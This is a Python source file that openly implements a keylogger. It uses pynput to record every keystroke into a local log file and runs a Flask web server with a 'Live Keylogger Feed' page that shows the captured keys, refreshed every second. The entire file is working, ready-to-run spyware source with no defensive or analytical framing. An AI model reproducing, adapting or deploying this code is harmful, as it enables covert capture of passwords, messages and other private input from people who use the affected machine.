from flask import Flask, render_template_string, jsonify
from threading import Thread
from pynput import keyboard
import os

log_file_path = "logs.txt"

def on_press(key):
    try:
        with open(log_file_path, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file_path, "a") as f:
            f.write(f"[{key}]")

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Keylogger Logs</title>
    <style>
        body { font-family: monospace; background: #111; color: #0f0; padding: 2rem; }
        #log { white-space: pre-wrap; background: #000; padding: 1rem; border: 1px solid #0f0; }
    </style>
</head>
<body>
    <h1>Live Keylogger Feed</h1>
    <div id="log">Loading...</div>
    <script>
        async function fetchLogs() {
            const res = await fetch("/logs");
            const data = await res.json();
            document.getElementById("log").textContent = data.data;
        }
        setInterval(fetchLogs, 1000);
        fetchLogs();
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/logs")
def logs():
    if not os.path.exists(log_file_path):
        return jsonify({"data": ""})
    with open(log_file_path, "r") as f:
        content = f.read()
    return jsonify({"data": content})


if __name__ == "__main__":
   
    keylogger_thread = Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

   
    app.run(port=5000, debug=False)
